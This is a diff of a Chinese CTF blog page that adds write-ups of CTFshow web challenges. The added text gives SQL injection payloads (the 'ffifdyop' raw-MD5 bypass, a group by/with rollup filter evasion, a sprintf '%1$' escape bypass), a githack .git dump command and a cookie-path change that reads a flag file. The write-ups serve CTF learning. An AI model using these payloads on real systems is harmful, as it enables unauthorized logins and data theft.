@@ -412,8 +412,8 @@ id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/CTF%E5%88%B7%E9%A2%98/">
-                                <span class="chip bg-color">CTF刷题</span>
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                     </div>
@@ -435,21 +435,21 @@ id=-1/**/union/**/select/**/1,group_concat(table_name),3/**/from/**/informat">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2024-11-26
+                    2024-12-05
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    389
+                    1.2k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -557,6 +557,106 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
 <pre class="line-numbers language-none"><code class="language-none">ctfshow{a8576530-bc13-4ea2-8976-d52947a19dbf}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241125235531635.png" alt="image-20241125235531635"></p>
+<h2 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h2><p>进入页面只有一个登录框，于是访问robots.txt文件看看</p>
+<p>发现存在目录index.phps，访问后下载到源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+        <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+		<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"password error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username ='admin' and password ='"</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">;</span>
+		<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">//行数大于零，即查询到的数据不为空</span>
+					<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+						 <span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br&gt;"</span><span class="token punctuation">;</span>
+						 <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+					 <span class="token punctuation">}</span>
+			<span class="token punctuation">}</span>
+    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>mysqli_num_rows</code>函数用于获取 MySQL 查询结果集中行的数量。</p>
+<p><code>mysqli_fetch_assoc</code>用于从查询结果中获取一行数据，并以 <strong>关联数组</strong> 的形式返回该行的结果。每个列名作为数组的键，列值作为数组的值。</p>
+<p>思路：sql语句对传入的密码值进行md5加密，<strong>利用MD5加密漏洞来绕过</strong></p>
+<p><strong>ffifdyop</strong> 的MD5加密结果是 <code>276f722736c95d99e921722cf9ed621c</code></p>
+<p>经过MySQL编码后会变成<code>'or'6xxx</code>,使SQL恒成立,相当于<strong>万能密码</strong>,可以绕过<code>md5()</code>函数的加密</p>
+<p>所以输入密码为ffifdyop，即可得到flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ctfshow<span class="token punctuation">{</span>a4c45b65-139b-4c53-b133-fd332ca629ac<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204213742362.png" alt="image-20241204213742362"></p>
+<h2 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h2><p>源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+		<span class="token variable">$flag</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
+        <span class="token keyword">function</span> <span class="token function-definition function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+             <span class="token variable">$regex</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/(select|from|where|join|sleep|and|\s|union|,)/i"</span><span class="token punctuation">;</span>
+             <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$regex</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$strParam</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">replaceSpecialChar</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+			<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sql inject error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username = '<span class="token interpolation"><span class="token variable">$username</span></span>'"</span><span class="token punctuation">;</span>
+		<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+					<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+						<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token operator">==</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+							<span class="token keyword">echo</span> <span class="token string double-quoted-string">"登陆成功&lt;br&gt;"</span><span class="token punctuation">;</span>
+							<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
+						<span class="token punctuation">}</span>
+
+					 <span class="token punctuation">}</span>
+			<span class="token punctuation">}</span>
+    <span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>过滤了很多注入语句<br>这里主要用group by和with rollup相结合<br>group by就是一个排列，默认升序<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>即添加with rollup后查询结果中将会多出一行，其中group by 后面的那个列为null，count（*）为统计和。<br>payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">username</span><span class="token operator">=</span>admin'/**/or/**/1<span class="token operator">=</span><span class="token number">1</span>/**/group/**/by/**/password/**/with/**/rollup<span class="token comment">#&amp;password=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204221911677.png" alt="image-20241204221911677"></p>
+<h2 id="给她"><a href="#给她" class="headerlink" title="给她"></a>给她</h2><p>知识点：<code>sprintf</code>函数与<code>addslashes</code>函数连用会造成逻辑漏洞</p>
+<p>进入题目发现SQL注入，但单引号被转义</p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204222745951.png" alt="image-20241204222745951"></p>
+<p>宽字节注入也试了一下，不行。而且注释符也不行，怀疑是预编译</p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204222830834.png" alt="image-20241204222830834"></p>
+<p>扫目录发现有.git文件，于是githack工具获取git泄露信息</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python githack.py https://004119f7-c318-4136-bf28-dbdb5becdb86.challenge.ctf.show/.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>得到hint.php</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$pass</span><span class="token operator">=</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"and pass='%s'"</span><span class="token punctuation">,</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">//转义单引号</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"select * from user where name='%s' <span class="token interpolation"><span class="token variable">$pass</span></span>"</span><span class="token punctuation">,</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>关键点：sprintf函数会将**<code>%\</code>,<code>%1$\</code>占位符替换为空**，如下所示</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user where username='%\' and 1=1 #';"</span><span class="token punctuation">;</span>
+<span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?&gt;</span></span>
+//打印出来：select * from user where username='' and 1=1 #';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>构造payload</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?name<span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">pass</span><span class="token operator">=</span>%1<span class="token string">$' or 1=1--+
+后台执行的php语句为：$sql = sprintf(" select * from user where name='</span>admin<span class="token string">' and pass='</span>%1$<span class="token punctuation">\</span>' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span>--+<span class="token string">' ");
+因为sprintf会将其中的  %1$\  替换为空
+所以最后执行的sql语句为：select * from user where name='</span>admin<span class="token string">' and pass='</span>' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span> --+<span class="token string">'
+--+注释后，即为：select * from user where name='</span>admin<span class="token string">' and pass='</span>' or <span class="token assign-left variable">1</span><span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204234103200.png" alt="image-20241204234103200"></p>
+<p>得到报错页面，查看源代码</p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204234155071.png" alt="image-20241204234155071"></p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241204235121796.png" alt="image-20241204235121796"></p>
+<p>用load_file 读文件失败</p>
+<p>然后发现刚刚这个页面下面有一行这个输出，是flag.txt文件里的内容<img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241205000354399.png" alt="image-20241205000354399"></p>
+<p>抓包发现，cookie:file=666c61672e747874，是flag.txt的十六进制数</p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241205000559349.png" alt="image-20241205000559349"></p>
+<p>把它改为/flag的十六进制数，拿到flag</p>
+<p><img src="/2024/11/25/ctf-shua-ti/ctfshow-web/image-20241205000841002.png"></p>
 
                 
             </div>
@@ -621,8 +721,8 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/CTF%E5%88%B7%E9%A2%98/">
-                                    <span class="chip bg-color">CTF刷题</span>
+                                <a href="/tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                         </div>
@@ -794,18 +894,17 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="far fa-dot-circle"></i>&nbsp;本篇
-            </div>
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2024/11/25/ctf-shua-ti/ctfshow-web/">
+                <a href="/2024/11/27/ctf-shua-ti/ctfshow-qian-dao-hao-wan-de-php/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CTFshow_web">
+                        <img src="/medias/featureimages/3.jpg" class="responsive-img" alt="签到·好玩的PHP">
                         
-                        <span class="card-title">CTFshow_web</span>
+                        <span class="card-title">签到·好玩的PHP</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -815,9 +914,9 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
                         
                     </div>
                     <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2024-11-25
-                            </span>
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-11-27
+                        </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -826,12 +925,11 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF%E5%88%B7%E9%A2%98/">
-                        <span class="chip bg-color">CTF刷题</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -875,8 +973,8 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/CTF%E5%88%B7%E9%A2%98/">
-                        <span class="chip bg-color">CTF刷题</span>
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                 </div>
@@ -1055,7 +1153,7 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2021-2024</span>
+                <span id="year">2021-2025</span>
             
             <a href="/about" target="_blank">0x00dream</a>
             |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
@@ -1063,7 +1161,7 @@ url<span class="token operator">=</span><span class="token string">'http://bc679
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">27.7k</span>
+                        class="white-color">32.1k</span>
             
             
             
